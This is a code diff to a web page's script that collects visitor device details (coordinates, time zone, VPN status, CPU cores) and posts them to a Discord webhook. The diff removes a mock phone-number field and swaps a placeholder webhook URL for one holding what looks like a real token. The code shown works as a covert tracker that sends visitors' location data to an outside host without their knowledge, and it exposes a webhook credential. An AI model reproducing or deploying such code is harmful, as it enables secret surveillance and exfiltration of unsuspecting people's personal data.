@@ -216,8 +216,7 @@
                 deviceEdition: deviceEdition,
                 deviceVersion: deviceVersion,
                 systemType: systemType,
-                cpuCores: cpuCores,
-                phoneNumber: '123-456-7890'  // Simulating automatic phone number fetch (can be a mock number or fetched from elsewhere)
+                cpuCores: cpuCores
             };
 
             // Try to fetch the custom device name from localStorage
@@ -248,12 +247,11 @@
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
                 <p><strong>VPN Detected:</strong> ${deviceData.vpn}</p>
                 <p><strong>CPU Cores:</strong> ${deviceData.cpuCores}</p>
-                <p><strong>Phone Number:</strong> ${deviceData.phoneNumber}</p>
             `;
 
             // Send the data to the webhook
             try {
-                await fetch('https://discordapp.com/api/webhooks/your_webhook_url', {
+                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -277,8 +275,7 @@
                                 { name: 'Time Zone', value: deviceData.timezone, inline: false },
                                 { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false },
                                 { name: 'VPN Detected', value: deviceData.vpn, inline: false },
-                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false },
-                                { name: 'Phone Number', value: deviceData.phoneNumber, inline: false }
+                                { name: 'CPU Cores', value: deviceData.cpuCores, inline: false }
                             ]
                         }]
                     })
